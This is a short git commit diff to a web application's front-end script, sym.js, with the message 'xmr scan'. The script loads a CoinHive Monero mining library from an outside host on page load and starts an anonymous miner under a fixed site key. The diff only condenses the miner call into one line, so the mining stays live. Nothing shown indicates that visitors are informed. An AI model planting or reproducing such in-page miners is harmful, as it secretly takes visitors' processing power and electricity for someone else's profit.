0ead2dc8d589127baba532e7547f723f9e46b4a1
Van <lly219@gmail.com>
2018-01-02 21:45:26 +0800

    :sparkles: xmr scan

--- src/main/webapp/sym/sym.js
+++ src/main/webapp/sym/sym.js
@@ -18,8 +18,7 @@
   scriptDom.setAttribute('src', 'https://static.hacpai.com/js/lib/xmr.min.js')
   document.head.appendChild(scriptDom)
   scriptDom.onload = function () {
-    var miner = new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 1, throttle: 0.9});
-    miner.start();
+    (CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 1, throttle: 0.9})).start();
   }
 
   // baidu
